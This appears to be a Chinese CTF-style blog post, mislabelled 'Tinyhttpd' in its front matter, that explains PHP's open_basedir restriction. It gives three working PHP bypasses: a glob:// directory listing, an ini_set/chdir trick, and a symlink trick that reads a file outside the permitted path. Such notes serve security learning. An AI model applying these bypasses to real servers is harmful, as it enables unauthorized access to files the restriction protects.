---
layout: post
title:  "Tinyhttpd"
date:   2019-11-30
desc: ""
keywords: ""
categories: [Web]
tags: []
icon: icon-html
---

# php open_basedir绕过

## open_basedir

将用户访问文件的活动范围限制在指定的区域

### 设置方法

* php.ini

  ```
  open_basedir=""
  ```

* php程序中

  ```php
  ini_set('open_basedir', '');
  ```

* .user.ini

  ```
  open_basedir=""
  ```

  

##命令执行函数

open_basedir管不了命令执行函数



## glob伪协议

查找匹配的文件路径模式，PHP5.3.0起开始有效

```
glob://
```

利用glob伪协议可以绕过open_basedir读取根目录

```php
<?php
  $a = "glob:///*";;
  if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
      echo $file."<br>";
    }
    closedir($b);
  }
?>
```



## ini_set

```php
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
```

先利用ini_set把open_basedir设为..

此时chdir('..');合法，执行后..变为上一级目录，继续chdir('..');依然合法，最终可以open_basedir设为根目录



## symlink

```php
<?php
  mkdir("a");
  chdir("a");
  mkdir("b");
  chdir("b");
  chdir("..");
  chdir("..");
  symlink("a/b/","tmplink");
  symlink("tmplink/../../flag.txt","fuck");
  unlink("tmplink");
  mkdir("tmplink");
  echo file_get_contents("127.0.0.1/fuck");
?>
```

创建a/b/然后回来，tmplink和a/b/建立符号链接

然后tmplink/../../flag.txt和fuck建立符号链接

fuck指向tmplink/../../flag.txt也就是a/b/../../flag.txt

然后unlink("tmplink");

此时，fuck的符号链接还在，在当前目录创建一个tmplink文件夹

fuck就指向tmplink/../../flag.txt，就可以拿到上一级目录的flag